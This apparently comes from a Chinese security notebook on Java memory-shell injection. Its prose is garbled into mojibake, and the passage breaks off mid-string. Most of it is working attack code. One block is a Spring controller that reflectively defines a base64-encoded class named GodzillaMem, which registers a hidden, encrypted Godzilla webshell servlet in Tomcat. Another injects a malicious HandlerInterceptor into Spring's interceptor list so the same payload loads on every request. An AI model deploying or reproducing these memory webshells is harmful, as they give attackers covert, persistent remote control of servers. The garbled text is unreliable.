Êç¢‰∏ÄÁßçÊñπÂºèÁî®defineÁ±ªÂä†ËΩΩÂ≠óËäÇÁ†ÅÔºåÊù•ÊêûÊØïÁ´üËøúÁ®ãÁéØÂ¢ÉÊ≤°ÊúâËøô‰∏™Á±ª

‰πüÊòØÂèØ‰ª•ÁöÑÁõ¥Êé•Êêû

```java
public class lastone {
    @RequestMapping("/JYcxk")
    public void abc() throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException {


        String base64Class = "yv66vgAAADQBWwoAXACpCACqCQBOAKsIAF8JAE4ArAcArQoABgCpCgAGAK4KAAYArwoATgCwCQBOALEIALIKALMAtAoAIQC1CgAhALYKALMAtwcAuAoAswC5CgARALoKABEAuwoAIQC8BwC9CAC+CgAeAL8IAMAKAB4AwQoAwgDDCgAgAMQIAMUHAMYHAH0HAMcHAMgIAMkKAB4AyggAywgAzAgAzQgAzggAzwgA0AoA0QDSBwDTCgArANQKANEA1QoA0QDWBwDXBwDYCgDZANoKANkA2woALwDcBwDdCADeCQDfAOAKAB4A4QoAwgDiCgDfAOMLAOQA5QoATgDmCgBOAOcJAE4A6AoATgDpBwDqCgA/AKkKACAA6wsA7ADtCgAhAO4KAO8A8AoAIACvCgA/APEKAE4A8goAIQDzBwD0CAD1CQBOAPYIAPcJAE4A+AcA+QoATgCpBwD6CgBQAPsLAPwA/QcA/goAUwD/CwEAAQELAQABAgsBAAEDCgAeAQQLAQABBQoAUwEGCgBTAQcHAQgBAAJ4YwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABHBhc3MBAAdwYXR0ZXJuAQALc2VydmxldE5hbWUBAANtZDUBAAdwYXlsb2FkAQARTGphdmEvbGFuZy9DbGFzczsBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEANExjb20vZXhhbXBsZS9zcHJpbmdib290MTIzNDUvQ29udHJvbGxlci9Hb2R6aWxsYU1lbTsBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAAW0BAB1MamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEAAXMBAANyZXQBAA1TdGFja01hcFRhYmxlBwDIBwC9AQAQTWV0aG9kUGFyYW1ldGVycwEADGJhc2U2NEVuY29kZQEAFihbQilMamF2YS9sYW5nL1N0cmluZzsBAAdFbmNvZGVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAGYmFzZTY0AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAAmJzAQACW0IBAAV2YWx1ZQEACkV4Y2VwdGlvbnMBAAxiYXNlNjREZWNvZGUBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAHZGVjb2RlcgEAAXgBAAcoW0JaKVtCAQABYwEAFUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEAAVoHAPkHAQkBAAhkZWZDbGFzcwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEACmNsYXNzQnl0ZXMBAA51cmxDbGFzc0xvYWRlcgEAGUxqYXZhL25ldC9VUkxDbGFzc0xvYWRlcjsBAAlkZWZNZXRob2QBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEABmRvUG9zdAEAUihMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7KVYBAAZhcnJPdXQBAB9MamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW07AQABZgEABGRhdGEBAANyZXEBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAARyZXNwAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwcA9AcBCgcBCwEACDxjbGluaXQ+AQAHc2VydmxldAEAF0xqYXZheC9zZXJ2bGV0L1NlcnZsZXQ7AQAVd2ViYXBwQ2xhc3NMb2FkZXJCYXNlAQAyTG9yZy9hcGFjaGUvY2F0YWxpbmEvbG9hZGVyL1dlYmFwcENsYXNzTG9hZGVyQmFzZTsBAAtzdGFuZGFyZEN0eAEAKkxvcmcvYXBhY2hlL2NhdGFsaW5hL2NvcmUvU3RhbmRhcmRDb250ZXh0OwEACm5ld1dyYXBwZXIBAB1Mb3JnL2FwYWNoZS9jYXRhbGluYS9XcmFwcGVyOwEAClNvdXJjZUZpbGUBABBHb2R6aWxsYU1lbS5qYXZhDABlAGYBABAzYzZlMGI4YTljMTUyMjRhDABdAF4MAF8AXgEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDAEMAQ0MAQ4BDwwAYgBsDABiAF4BAANNRDUHARAMAREBEgwBEwEUDAEVARYMARcBGAEAFGphdmEvbWF0aC9CaWdJbnRlZ2VyDAEZARQMAGUBGgwBDgEbDAEcAQ8BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAQamF2YS51dGlsLkJhc2U2NAwBHQEeAQAKZ2V0RW5jb2RlcgwBHwEgBwEhDAEiASMMASQBJQEADmVuY29kZVRvU3RyaW5nAQAPamF2YS9sYW5nL0NsYXNzAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBABZzdW4ubWlzYy5CQVNFNjRFbmNvZGVyDAEmAScBAAZlbmNvZGUBAApnZXREZWNvZGVyAQAGZGVjb2RlAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgEADGRlY29kZUJ1ZmZlcgEAA0FFUwcBCQwBEQEoAQAfamF2YXgvY3J5cHRvL3NwZWMvU2VjcmV0S2V5U3BlYwwAZQEpDAEqASsMASwBLQEAF2phdmEvbmV0L1VSTENsYXNzTG9hZGVyAQAMamF2YS9uZXQvVVJMBwEuDAEvATAMATEBMgwAZQEzAQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQALZGVmaW5lQ2xhc3MHATQMATUAZAwBNgEgDAE3ATgMATkBOgcBOwwBPABsDACAAIEMAIMAhAwAYwBkDACKAIsBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQwBPQE+BwE/DAFAAUEMAUIBQwcBRAwBRQFGDAFHARQMAHUAdgwBQgEbAQATamF2YS9sYW5nL1Rocm93YWJsZQEABS9sb2dzDABgAF4BAApKVk1TZXJ2aWNlDABhAF4BADJjb20vZXhhbXBsZS9zcHJpbmdib290MTIzNDUvQ29udHJvbGxlci9Hb2R6aWxsYU1lbQEAMG9yZy9hcGFjaGUvY2F0YWxpbmEvbG9hZGVyL1dlYmFwcENsYXNzTG9hZGVyQmFzZQwBSAFJBwFKDAFLAUwBAChvcmcvYXBhY2hlL2NhdGFsaW5hL2NvcmUvU3RhbmRhcmRDb250ZXh0DAFNAU4HAU8MAVABRgwBUQFSDAFTAVQMAVUBDwwBVgFGDAFXAVgMAVkBWgEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldAEAE2phdmF4L2NyeXB0by9DaXBoZXIBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAG2phdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdAEAC2dldEluc3RhbmNlAQAxKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEACGdldEJ5dGVzAQAEKClbQgEABmxlbmd0aAEAAygpSQEABnVwZGF0ZQEAByhbQklJKVYBAAZkaWdlc3QBAAYoSVtCKVYBABUoSSlMamF2YS9sYW5nL1N0cmluZzsBAAt0b1VwcGVyQ2FzZQEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBACkoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEAFyhbQkxqYXZhL2xhbmcvU3RyaW5nOylWAQAEaW5pdAEAFyhJTGphdmEvc2VjdXJpdHkvS2V5OylWAQAHZG9GaW5hbAEABihbQilbQgEAEGphdmEvbGFuZy9UaHJlYWQBAA1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQApKFtMamF2YS9uZXQvVVJMO0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7KVYBABFqYXZhL2xhbmcvSW50ZWdlcgEABFRZUEUBABFnZXREZWNsYXJlZE1ldGhvZAEADXNldEFjY2Vzc2libGUBAAQoWilWAQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAMZ2V0UGFyYW1ldGVyAQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEACXN1YnN0cmluZwEAFihJSSlMamF2YS9sYW5nL1N0cmluZzsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAFd3JpdGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAt0b0J5dGVBcnJheQEADGdldFJlc291cmNlcwEAJygpTG9yZy9hcGFjaGUvY2F0YWxpbmEvV2ViUmVzb3VyY2VSb290OwEAI29yZy9hcGFjaGUvY2F0YWxpbmEvV2ViUmVzb3VyY2VSb290AQAKZ2V0Q29udGV4dAEAHygpTG9yZy9hcGFjaGUvY2F0YWxpbmEvQ29udGV4dDsBAA1jcmVhdGVXcmFwcGVyAQAfKClMb3JnL2FwYWNoZS9jYXRhbGluYS9XcmFwcGVyOwEAG29yZy9hcGFjaGUvY2F0YWxpbmEvV3JhcHBlcgEAB3NldE5hbWUBABBzZXRMb2FkT25TdGFydHVwAQAEKEkpVgEACnNldFNlcnZsZXQBABooTGphdmF4L3NlcnZsZXQvU2VydmxldDspVgEAB2dldE5hbWUBAA9zZXRTZXJ2bGV0Q2xhc3MBAAhhZGRDaGlsZAEAIihMb3JnL2FwYWNoZS9jYXRhbGluYS9Db250YWluZXI7KVYBABhhZGRTZXJ2bGV0TWFwcGluZ0RlY29kZWQBACcoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7KVYAIQBOAFwAAAAGAAAAXQBeAAAAAABfAF4AAAAIAGAAXgAAAAgAYQBeAAAAAABiAF4AAAAAAGMAZAAAAAgAAQBlAGYAAQBnAAAAZgADAAEAAAAwKrcAASoSArUAAyoSBLUABSq7AAZZtwAHKrQABbYACCq0AAO2AAi2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";
        byte[] bytes = Base64.getDecoder().decode(base64Class);
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
        Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
        defMethod.setAccessible(true);

        Class invoke = (Class) defMethod.invoke(urlClassLoader, bytes, 0, bytes.length);
        invoke.getConstructor().newInstance();
    }
}
```

ÈÇ£Êã¶Êà™Âô®ÊâìÂì•ÊñØÊãâÈ©¨ÊåâÁêÜËØ¥Â∫îËØ•‰πüÂèØ‰ª•ÔºåËôΩÁÑ∂ËØ¥Êúâ‰∫õÂ§ö‰ΩôÔºàqaq

‰πüÈÄö‰∫ÜÔºåÊØïÁ´üÊúâÁïåÈù¢ÊØîÁõ≤ÊâìÂ•ΩÂ§ö‰∫ÜÂëóÔºå‰ª•ÂêéÂÜÖÂ≠òÈ©¨ÊÄùË∑Ø

Â¶ÇÊûúËÉΩdefineÂèÇÊï∞ÂèØÊéßÁõ¥Êé•ÊâìÂì•ÊñØÊãâ

templatesÁõ¥Êé•ÊõøÊç¢Âä†ËΩΩÂç≥ÂèØ

```java
package com.example.springboot12345.Controller;

import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.ModelAndView;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.Base64;
import java.util.List;
import java.util.Scanner;
@RestController
public class InjectInterceptor implements HandlerInterceptor {
   @RequestMapping("/aaa")
    public void aaa(){
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
        Field field = null;
        try {
            field = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        }
        field.setAccessible(true);
        List<HandlerInterceptor> adaptInterceptors = null;
        try {
            adaptInterceptors = (List<HandlerInterceptor>) field.get(mappingHandlerMapping);
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
       InjectInterceptor evilInterceptor = new InjectInterceptor();
        adaptInterceptors.add(evilInterceptor);}


    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
       try {
           String base64Class = "yv66vgAAADQBWwoAXACpCACqCQBOAKsIAF8JAE4ArAcArQoABgCpCgAGAK4KAAYArwoATgCwCQBOALEIALIKALMAtAoAIQC1CgAhALYKALMAtwcAuAoAswC5CgARALoKABEAuwoAIQC8BwC9CAC+CgAeAL8IAMAKAB4AwQoAwgDDCgAgAMQIAMUHAMYHAH0HAMcHAMgIAMkKAB4AyggAywgAzAgAzQgAzggAzwgA0AoA0QDSBwDTCgArANQKANEA1QoA0QDWBwDXBwDYCgDZANoKANkA2woALwDcBwDdCADeCQDfAOAKAB4A4QoAwgDiCgDfAOMLAOQA5QoATgDmCgBOAOcJAE4A6AoATgDpBwDqCgA/AKkKACAA6wsA7ADtCgAhAO4KAO8A8AoAIACvCgA/APEKAE4A8goAIQDzBwD0CAD1CQBOAPYIAPcJAE4A+AcA+QoATgCpBwD6CgBQAPsLAPwA/QcA/goAUwD/CwEAAQELAQABAgsBAAEDCgAeAQQLAQABBQoAUwEGCgBTAQcHAQgBAAJ4YwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABHBhc3MBAAdwYXR0ZXJuAQALc2VydmxldE5hbWUBAANtZDUBAAdwYXlsb2FkAQARTGphdmEvbGFuZy9DbGFzczsBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEANExjb20vZXhhbXBsZS9zcHJpbmdib290MTIzNDUvQ29udHJvbGxlci9Hb2R6aWxsYU1lbTsBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAAW0BAB1MamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEAAXMBAANyZXQBAA1TdGFja01hcFRhYmxlBwDIBwC9AQAQTWV0aG9kUGFyYW1ldGVycwEADGJhc2U2NEVuY29kZQEAFihbQilMamF2YS9sYW5nL1N0cmluZzsBAAdFbmNvZGVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAGYmFzZTY0AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAAmJzAQACW0IBAAV2YWx1ZQEACkV4Y2VwdGlvbnMBAAxiYXNlNjREZWNvZGUBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAHZGVjb2RlcgEAAXgBAAcoW0JaKVtCAQABYwEAFUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEAAVoHAPkHAQkBAAhkZWZDbGFzcwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEACmNsYXNzQnl0ZXMBAA51cmxDbGFzc0xvYWRlcgEAGUxqYXZhL25ldC9VUkxDbGFzc0xvYWRlcjsBAAlkZWZNZXRob2QBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEABmRvUG9zdAEAUihMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7KVYBAAZhcnJPdXQBAB9MamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW07AQABZgEABGRhdGEBAANyZXEBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAARyZXNwAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwcA9AcBCgcBCwEACDxjbGluaXQ+AQAHc2VydmxldAEAF0xqYXZheC9zZXJ2bGV0L1NlcnZsZXQ7AQAVd2ViYXBwQ2xhc3NMb2FkZXJCYXNlAQAyTG9yZy9hcGFjaGUvY2F0YWxpbmEvbG9hZGVyL1dlYmFwcENsYXNzTG9hZGVyQmFzZTsBAAtzdGFuZGFyZEN0eAEAKkxvcmcvYXBhY2hlL2NhdGFsaW5hL2NvcmUvU3RhbmRhcmRDb250ZXh0OwEACm5ld1dyYXBwZXIBAB1Mb3JnL2FwYWNoZS9jYXRhbGluYS9XcmFwcGVyOwEAClNvdXJjZUZpbGUBABBHb2R6aWxsYU1lbS5qYXZhDABlAGYBABAzYzZlMGI4YTljMTUyMjRhDABdAF4MAF8AXgEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDAEMAQ0MAQ4BDwwAYgBsDABiAF4BAANNRDUHARAMAREBEgwBEwEUDAEVARYMARcBGAEAFGphdmEvbWF0aC9CaWdJbnRlZ2VyDAEZARQMAGUBGgwBDgEbDAEcAQ8BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAQamF2YS51dGlsLkJhc2U2NAwBHQEeAQAKZ2V0RW5jb2RlcgwBHwEgBwEhDAEiASMMASQBJQEADmVuY29kZVRvU3RyaW5nAQAPamF2YS9sYW5nL0NsYXNzAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBABZzdW4ubWlzYy5CQVNFNjRFbmNvZGVyDAEmAScBAAZlbmNvZGUBAApnZXREZWNvZGVyAQAGZGVjb2RlAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgEADGRlY29kZUJ1ZmZlcgEAA0FFUwcBCQwBEQEoAQAfamF2YXgvY3J5cHRvL3NwZWMvU2VjcmV0S2V5U3BlYwwAZQEpDAEqASsMASwBLQEAF2phdmEvbmV0L1VSTENsYXNzTG9hZGVyAQAMamF2YS9uZXQvVVJMBwEuDAEvATAMATEBMgwAZQEzAQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQALZGVmaW5lQ2xhc3MHATQMATUAZAwBNgEgDAE3ATgMATkBOgcBOwwBPABsDACAAIEMAIMAhAwAYwBkDACKAIsBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQwBPQE+BwE/DAFAAUEMAUIBQwcBRAwBRQFGDAFHARQMAHUAdgwBQgEbAQATamF2YS9sYW5nL1Rocm93YWJsZQEABS9sb2dzDABgAF4BAApKVk1TZXJ2aWNlDABhAF4BADJjb20vZXhhbXBsZS9zcHJpbmdib290MTIzNDUvQ29udHJvbGxlci9Hb2R6aWxsYU1lbQEAMG9yZy9hcGFjaGUvY2F0YWxpbmEvbG9hZGVyL1dlYmFwcENsYXNzTG9hZGVyQmFzZQwBSAFJBwFKDAFLAUwBAChvcmcvYXBhY2hlL2NhdGFsaW5hL2NvcmUvU3RhbmRhcmRDb250ZXh0DAFNAU4HAU8MAVABRgwBUQFSDAFTAVQMAVUBDwwBVgFGDAFXAVgMAVkBWgEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldAEAE2phdmF4L2NyeXB0by9DaXBoZXIBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAG2phdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdAEAC2dldEluc3RhbmNlAQAxKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEACGdldEJ5dGVzAQAEKClbQgEABmxlbmd0aAEAAygpSQEABnVwZGF0ZQEAByhbQklJKVYBAAZkaWdlc3QBAAYoSVtCKVYBABUoSSlMamF2YS9sYW5nL1N0cmluZzsBAAt0b1VwcGVyQ2FzZQEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBACkoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEAFyhbQkxqYXZhL2xhbmcvU3RyaW5nOylWAQAEaW5pdAEAFyhJTGphdmEvc2VjdXJpdHkvS2V5OylWAQAHZG9GaW5hbAEABihbQilbQgEAEGphdmEvbGFuZy9UaHJlYWQBAA1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQApKFtMamF2YS9uZXQvVVJMO0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7KVYBABFqYXZhL2xhbmcvSW50ZWdlcgEABFRZUEUBABFnZXREZWNsYXJlZE1ldGhvZAEADXNldEFjY2Vzc2libGUBAAQoWilWAQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAMZ2V0UGFyYW1ldGVyAQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEACXN1YnN0cmluZwEAFihJSSlMamF2YS9sYW5nL1N0cmluZzsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAFd3JpdGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAt0b0J5dGVBcnJheQEADGdldFJlc291cmNlcwEAJygpTG9yZy9hcGFjaGUvY2F0YWxpbmEvV2ViUmVzb3VyY2VSb290OwEAI29yZy9hcGFjaGUvY2F0YWxpbmEvV2ViUmVzb3VyY2VSb290AQAKZ2V0Q29udGV4dAEAHy